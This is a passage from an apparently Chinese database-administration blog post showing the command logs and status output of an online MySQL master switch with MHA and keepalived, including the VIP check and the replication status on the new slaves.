settings..</span><br><span class="line">    Opening /my/data/percona/relay-log.info ... ok.</span><br><span class="line">    Relay <span class="built_in">log</span> found at /<span class="built_in">log</span>/mysql/relaylog, up to relay-log.014072</span><br><span class="line">    Temporary relay <span class="built_in">log</span> file is /<span class="built_in">log</span>/mysql/relaylog/relay-log.014072</span><br><span class="line">    Testing mysql connection and privileges..Warning: Using a password on the <span class="built_in">command</span> line interface can be insecure.</span><br><span class="line"> <span class="keyword">done</span>.</span><br><span class="line">    Testing mysqlbinlog output.. <span class="keyword">done</span>.</span><br><span class="line">    Cleaning up <span class="built_in">test</span> file(s).. <span class="keyword">done</span>.</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info] Slaves settings check <span class="keyword">done</span>.</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info] </span><br><span class="line">10.25.1.66(10.25.1.66:3306) (current master)</span><br><span class="line"> +--10.25.1.67(10.25.1.67:3306)</span><br><span class="line"> +--10.25.1.68(10.25.1.68:3306)</span><br><span class="line"></span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info] Checking replication health on 10.25.1.67..</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info]  ok.</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info] Checking replication health on 10.25.1.68..</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info]  ok.</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info] Checking master_ip_failover_script status:</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info]   /root/dba/mha/script/master_ip_failover.sh --<span class="built_in">command</span>=status --ssh_user=root --orig_master_host=10.25.1.66 --orig_master_ip=10.25.1.66 --orig_master_port=3306 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IN SCRIPT TEST====/etc/init.d/keepalived stop==/etc/init.d/keepalived start===</span><br><span class="line"></span><br><span class="line">Checking the Status of the script.. OK </span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info]  OK.</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [warning] shutdown_script is not defined.</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info] Got <span class="built_in">exit</span> code 0 (Not master dead).</span><br><span class="line"></span><br><span class="line">MySQL Replication Health is OK.</span><br></pre></td></tr></tbody></table></figure><p>&#x6267;&#x884C; masterha_master_switch &#x547D;&#x4EE4;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># masterha_master_switch --conf=/root/dba/mha/conf/babybi_#1.conf --master_state=alive --new_master_host=10.25.1.67 --new_master_port=3306 --orig_master_is_new_slave --running_updates_limit=10000</span></span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">Wed Mar 27 23:34:27 2019 - [info] MHA::MasterRotate version 0.56.</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info] Starting online master switch..</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info] </span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info] * Phase 1: Configuration Check Phase..</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info] </span><br><span class="line">Wed Mar 27 23:34:27 2019 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info] Reading application default configuration from /root/dba/mha/conf/babybi_<span class="comment">#1.conf..</span></span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info] Reading server configuration from /root/dba/mha/conf/babybi_<span class="comment">#1.conf..</span></span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info] GTID failover mode = 0</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info] Current Alive Master: 10.25.1.66(10.25.1.66:3306)</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info] Alive Slaves:</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info]   10.25.1.67(10.25.1.67:3306)  Version=5.6.29-76.2-log (oldest major version between slaves) <span class="built_in">log</span>-bin:enabled</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info]     Replicating from 10.25.1.66(10.25.1.66:3306)</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info]     Primary candidate <span class="keyword">for</span> the new Master (candidate_master is <span class="built_in">set</span>)</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info]   10.25.1.68(10.25.1.68:3306)  Version=5.6.29-76.2-log (oldest major version between slaves) <span class="built_in">log</span>-bin:enabled</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info]     Replicating from 10.25.1.66(10.25.1.66:3306)</span><br><span class="line"></span><br><span class="line">It is better to execute FLUSH NO_WRITE_TO_BINLOG TABLES on the master before switching. Is it ok to execute on 10.25.1.66(10.25.1.66:3306)? (YES/no): ---&gt; &#x8F93;&#x5165;: yes</span><br><span class="line">Wed Mar 27 23:34:34 2019 - [info] Executing FLUSH NO_WRITE_TO_BINLOG TABLES. This may take long time..</span><br><span class="line">Wed Mar 27 23:34:34 2019 - [info]  ok.</span><br><span class="line">Wed Mar 27 23:34:34 2019 - [info] Checking MHA is not monitoring or doing failover..</span><br><span class="line">Wed Mar 27 23:34:34 2019 - [info] Checking replication health on 10.25.1.67..</span><br><span class="line">Wed Mar 27 23:34:34 2019 - [info]  ok.</span><br><span class="line">Wed Mar 27 23:34:34 2019 - [info] Checking replication health on 10.25.1.68..</span><br><span class="line">Wed Mar 27 23:34:34 2019 - [info]  ok.</span><br><span class="line">Wed Mar 27 23:34:34 2019 - [info] 10.25.1.67 can be new master.</span><br><span class="line">Wed Mar 27 23:34:34 2019 - [info] </span><br><span class="line">From:</span><br><span class="line">10.25.1.66(10.25.1.66:3306) (current master)</span><br><span class="line"> +--10.25.1.67(10.25.1.67:3306)</span><br><span class="line"> +--10.25.1.68(10.25.1.68:3306)</span><br><span class="line"></span><br><span class="line">To:</span><br><span class="line">10.25.1.67(10.25.1.67:3306) (new master)</span><br><span class="line"> +--10.25.1.68(10.25.1.68:3306)</span><br><span class="line"> +--10.25.1.66(10.25.1.66:3306)</span><br><span class="line"></span><br><span class="line">Starting master switch from 10.25.1.66(10.25.1.66:3306) to 10.25.1.67(10.25.1.67:3306)? (yes/NO): ---&gt; &#x8F93;&#x5165;: yes</span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info] Checking whether 10.25.1.67(10.25.1.67:3306) is ok <span class="keyword">for</span> the new master..</span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info]  ok.</span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info] 10.25.1.66(10.25.1.66:3306): SHOW SLAVE STATUS returned empty result. To check replication filtering rules, temporarily executing CHANGE MASTER to a dummy host.</span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info] 10.25.1.66(10.25.1.66:3306): Resetting slave pointing to the dummy host.</span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info] ** Phase 1: Configuration Check Phase completed.</span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info] </span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info] * Phase 2: Rejecting updates Phase..</span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info] </span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info] Executing master ip online change script to <span class="built_in">disable</span> write on the current master:</span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info]   /root/dba/mha/script/master_ip_online_change.sh --<span class="built_in">command</span>=stop --orig_master_host=10.25.1.66 --orig_master_ip=10.25.1.66 --orig_master_port=3306 --orig_master_user=<span class="string">&apos;mha&apos;</span> --orig_master_password=<span class="string">&apos;mhapassword&apos;</span> --new_master_host=10.25.1.67 --new_master_ip=10.25.1.67 --new_master_port=3306 --new_master_user=<span class="string">&apos;mha&apos;</span> --new_master_password=<span class="string">&apos;mhapassword&apos;</span> --orig_master_ssh_user=root --new_master_ssh_user=root   --orig_master_is_new_slave</span><br><span class="line">2019-03-27 23:34:38 set_mysql_read_only successful!</span><br><span class="line">Stopping keepalived: [  OK  ]</span><br><span class="line">2019-03-27 23:34:38 stop_keepalived successful!</span><br><span class="line">Wed Mar 27 23:34:38 2019 - [info]  ok.</span><br><span class="line">Wed Mar 27 23:34:38 2019 - [info] Locking all tables on the orig master to reject updates from everybody (including root):</span><br><span class="line">Wed Mar 27 23:34:38 2019 - [info] Executing FLUSH TABLES WITH READ LOCK..</span><br><span class="line">Wed Mar 27 23:34:38 2019 - [info]  ok.</span><br><span class="line">Wed Mar 27 23:34:38 2019 - [info] Orig master binlog:pos is mysql-bin.004691:854373586.</span><br><span class="line">Wed Mar 27 23:34:38 2019 - [info]  Waiting to execute all relay logs on 10.25.1.67(10.25.1.67:3306)..</span><br><span class="line">Wed Mar 27 23:34:38 2019 - [info]  master_pos_wait(mysql-bin.004691:854373586) completed on 10.25.1.67(10.25.1.67:3306). Executed 0 events.</span><br><span class="line">Wed Mar 27 23:34:38 2019 - [info]   <span class="keyword">done</span>.</span><br><span class="line">Wed Mar 27 23:34:38 2019 - [info] Getting new master<span class="string">&apos;s binlog name and position..</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]  mysql-bin.000001:120</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]  All other slaves should start replication from here. Statement should be: CHANGE MASTER TO MASTER_HOST=&apos;</span>10.25.1.67<span class="string">&apos;, MASTER_PORT=3306, MASTER_LOG_FILE=&apos;</span>mysql-bin.000001<span class="string">&apos;, MASTER_LOG_POS=120, MASTER_USER=&apos;</span>repl<span class="string">&apos;, MASTER_PASSWORD=&apos;</span>xxx<span class="string">&apos;;</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info] Executing master ip online change script to allow write on the new master:</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]   /root/dba/mha/script/master_ip_online_change.sh --command=start --orig_master_host=10.25.1.66 --orig_master_ip=10.25.1.66 --orig_master_port=3306 --orig_master_user=&apos;</span>mha<span class="string">&apos; --orig_master_password=&apos;</span>mhapassword<span class="string">&apos; --new_master_host=10.25.1.67 --new_master_ip=10.25.1.67 --new_master_port=3306 --new_master_user=&apos;</span>mha<span class="string">&apos; --new_master_password=&apos;</span>mhapassword<span class="string">&apos; --orig_master_ssh_user=root --new_master_ssh_user=root   --orig_master_is_new_slave</span></span><br><span class="line"><span class="string">Starting keepalived: [  OK  ]</span></span><br><span class="line"><span class="string">2019-03-27 23:34:38 start_keepalived successful!</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]  ok.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info] Setting read_only=0 on 10.25.1.67(10.25.1.67:3306)..</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]  ok.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info] </span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info] * Switching slaves in parallel..</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info] </span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info] -- Slave switch on host 10.25.1.68(10.25.1.68:3306) started, pid: 20673</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info] </span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info] Log messages from 10.25.1.68 ...</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] </span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]  Waiting to execute all relay logs on 10.25.1.68(10.25.1.68:3306)..</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]  master_pos_wait(mysql-bin.004691:854373586) completed on 10.25.1.68(10.25.1.68:3306). Executed 0 events.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]   done.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]  Resetting slave 10.25.1.68(10.25.1.68:3306) and starting replication from the new master 10.25.1.67(10.25.1.67:3306)..</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]  Executed CHANGE MASTER.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]  Slave started.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] End of log messages from 10.25.1.68 ...</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] </span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] -- Slave switch on host 10.25.1.68(10.25.1.68:3306) succeeded.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] Unlocking all tables on the orig master:</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] Executing UNLOCK TABLES..</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info]  ok.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] Starting orig master as a new slave..</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info]  Resetting slave 10.25.1.66(10.25.1.66:3306) and starting replication from the new master 10.25.1.67(10.25.1.67:3306)..</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info]  Executed CHANGE MASTER.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info]  Slave started.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] All new slave servers switched successfully.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] </span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] * Phase 5: New master cleanup phase..</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] </span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info]  10.25.1.67: Resetting slave info succeeded.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] Switching master to 10.25.1.67(10.25.1.67:3306) completed successfully.</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ps -ef|grep babybi_#1.conf</span></span><br><span class="line">root      3578     1  0 Jan08 ?        00:42:35 perl /usr/bin/masterha_manager --conf=/root/dba/mha/conf/babybi_<span class="comment">#1.conf --ignore_last_failover</span></span><br><span class="line">root     21082 17518  0 23:35 pts/0    00:00:00 grep --colour=auto babybi_<span class="comment">#1.conf</span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><p>&#x5230;new_master&#x673A;&#x5668;&#x4E2D;&#x67E5;&#x770B;VIP&#x6709;&#x6CA1;&#x6709;&#x7ED1;&#x5B9A;&#x8FC7;&#x6765;&#x5230;&#x7F51;&#x5361;&#x4E0A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ip a</span></span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN </span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: em1: &lt;BROADCAST,MULTICAST,SLAVE,UP,LOWER_UP&gt; mtu 1500 qdisc mq master bond0 state UP qlen 1000</span><br><span class="line">    link/ether 24:6e:96:13:61:30 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">3: em2: &lt;BROADCAST,MULTICAST,SLAVE,UP,LOWER_UP&gt; mtu 1500 qdisc mq master bond0 state UP qlen 1000</span><br><span class="line">    link/ether 24:6e:96:13:61:30 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">4: em3: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN qlen 1000</span><br><span class="line">    link/ether 24:6e:96:13:61:34 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">5: em4: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN qlen 1000</span><br><span class="line">    link/ether 24:6e:96:13:61:35 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">6: bond0: &lt;BROADCAST,MULTICAST,MASTER,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP </span><br><span class="line">    link/ether 24:6e:96:13:61:30 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.25.1.67/24 brd 10.25.1.255 scope global bond0</span><br><span class="line">    inet 10.25.1.203/32 scope global bond0</span><br><span class="line">    inet6 fe80::266e:96ff:fe13:6130/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></tbody></table></figure><p>&#x767B;&#x5F55;&#x5230;slave&#x673A;&#x5668;&#x4E0A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show slave status\G</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    2049252955</span><br><span class="line">Current database: *** NONE ***</span><br><span class="line"></span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Waiting <span class="keyword">for</span> master to send event</span><br><span class="line">                  Master_Host: 10.25.1.67</span><br><span class="line">                  Master_User: repl</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 60</span><br><span class="line">              Master_Log_File: mysql-bin.000001</span><br><span class="line">          Read_Master_Log_Pos: 62528</span><br><span class="line">               Relay_Log_File: relay-log.000002</span><br><span class="line">                Relay_Log_Pos: 62691</span><br><span class="line">        Relay_Master_Log_File: mysql-bin.000001</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">              Replicate_Do_DB: </span><br><span class="line">          Replicate_Ignore_DB: </span><br><span class="line">           Replicate_Do_Table: </span><br><span class="line">       Replicate_Ignore_Table: </span><br><span class="line">      Replicate_Wild_Do_Table: </span><br><span class="line">  Replicate_Wild_Ignore_Table: </span><br><span class="line">                   Last_Errno: 0</span><br><span class="line">                   Last_Error: </span><br><span class="line">                 Skip_Counter: 0</span><br><span class="line">          Exec_Master_Log_Pos: 62528</span><br><span class="line">              Relay_Log_Space: 62858</span><br><span class="line">              Until_Condition: None</span><br><span class="line">               Until_Log_File: </span><br><span class="line">                Until_Log_Pos: 0</span><br><span class="line">           Master_SSL_Allowed: No</span><br><span class="line">           Master_SSL_CA_File: </span><br><span class="line">           Master_SSL_CA_Path: </span><br><span class="line">              Master_SSL_Cert: </span><br><span class="line">            Master_SSL_Cipher: </span><br><span class="line">               Master_SSL_Key: </span><br><span class="line">        Seconds_Behind_Master: 0</span><br><span class="line">Master_SSL_Verify_Server_Cert: No</span><br><span class="line">                Last_IO_Errno: 0</span><br><span class="line">                Last_IO_Error: </span><br><span class="line">               Last_SQL_Errno: 0</span><br><span class="line">               Last_SQL_Error: </span><br><span class="line">  Replicate_Ignore_Server_Ids: </span><br><span class="line">             Master_Server_Id: 1673306</span><br><span class="line">                  Master_UUID: ca479c32-fa0d-11e8-bc0f-246e96136130</span><br><span class="line">             Master_Info_File: /my/data/percona/master.info</span><br><span class="line">                    SQL_Delay: 0</span><br><span class="line">          SQL_Remaining_Delay: NULL</span><br><span class="line">      Slave_SQL_Running_State: Slave has <span class="built_in">read</span> all relay <span class="built_in">log</span>; waiting <span class="keyword">for</span> the slave I/O thread to update it</span><br><span class="line">           Master_Retry_Count: 86400</span><br><span class="line">                  Master_Bind: </span><br><span class="line">      Last_IO_Error_Timestamp: </span><br><span class="line">     Last_SQL_Error_Timestamp: </span><br><span class="line">               Master_SSL_Crl: </span><br><span class="line">           Master_SSL_Crlpath: </span><br><span class="line">           Retrieved_Gtid_Set: </span><br><span class="line">            Executed_Gtid_Set: </span><br><span class="line">                Auto_Position: 0</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6B63;&#x5E38; CHANGE MASTER TO NEW_MASTER </p><p>&#x767B;&#x5F55;&#x5230;old_master&#x4E2D;&#x67E5;&#x770B;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show slave status\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Waiting <span class="keyword">for</span> master to send event</span><br><span class="line">                  Master_Host: 10.25.1.67</span><br><span class="line">                  Master_User: repl</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 60</span><br><span class="line">              Master_Log_File: mysql-bin.000001</span><br><span class="line">          Read_Master_Log_Pos: 66875</span><br><span class="line">               Relay_Log_File: relay-log.000002</span><br><span class="line">                Relay_Log_Pos: 67038</span><br><span class="line">        Relay_Master_Log_File: mysql-bin.000001</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">              Replicate_Do_DB: </span><br><span class="line">          Replicate_Ignore_DB: </span><br><span class="line">           Replicate_Do_Table: </span><br><span class="line">       Replicate_Ignore_Table: </span><br><span class="line">      Replicate_Wild_Do_Table: </span><br><span class="line">  Replicate_Wild_Ignore_Table: </span><br><span class="line">                   Last_Errno: 0</span><br><span class="line">                   Last_Error: </span><br><span class="line">                 Skip_Counter: 0</span><br><span class="line">          Exec_Master_Log_Pos: 66875</span><br><span class="line">              Relay_Log_Space: 67205</span><br><span class="line">              Until_Condition: None</span><br><span class="line">               Until_Log_File: </span><br><span class="line">                Until_Log_Pos: 0</span><br><span class="line">           Master_SSL_Allowed: No</span><br><span class="line">           Master_SSL_CA_File: </span><br><span class="line">           Master_SSL_CA_Path: </span><br><span class="line">              Master_SSL_Cert: </span><br><span class="line">            Master_SSL_Cipher: </span><br><span class="line">               Master_SSL_Key: </span><br><span class="line">        Seconds_Behind_Master: 0</span><br><span class="line">Master_SSL_Verify_Server_Cert: No</span><br><span class="line">                Last_IO_Errno: 0</span><br><span class="line">                Last_IO_Error: </span><br><span class="line">               Last_SQL_Errno: 0</span><br><span class="line">               Last_SQL_Error: </span><br><span class="line">  Replicate_Ignore_Server_Ids: </span><br><span class="line">             Master_Server_Id: 1673306</span><br><span class="line">                  Master_UUID: ca479c32-fa0d-11e8-bc0f-246e96136130</span><br><span class="line">             Master_Info_File: /my/data/percona/master.info</span><br><span class="line">                    SQL_Delay: 0</span><br><span class="line">          SQL_Remaining_Delay: NULL</span><br><span class="line">      Slave_SQL_Running_State: Slave has <span class="built_in">read</span> all relay <span class="built_in">log</span>; waiting <span class="keyword">for</span> the slave I/O thread to update it</span><br><span class="line">           Master_Retry_Count: 86400</span><br><span class="line">                  Master_Bind: </span><br><span class="line">      Last_IO_Error_Timestamp: </span><br><span class="line">     Last_SQL_Error_Timestamp: </span><br><span class="line">               Master_SSL_Crl: </span><br><span class="line">           Master_SSL_Crlpath: </span><br><span class="line">           Retrieved_Gtid_Set: </span><br><span class="line">            Executed_Gtid_Set: </span><br><span class="line">                Auto_Position: 0</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5230;new_master&#x4E0A;&#x67E5;&#x770B;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ps -ef|grep keepalived</span><br><span class="line">root     37477     1  0 23:41 ?        00:00:00 /usr/sbin/keepalived -D</span><br><span class="line">root     37478 37477  0 23:41 ?        00:00:00 /usr/sbin/keepalived -D</span><br><span class="line">root     37479 37477  0 23:41 ?        00:00:00 /usr/sbin/keepalived -D</span><br><span class="line">dbctl    38747 35598  0 23:49 pts/0    00:00:00 grep 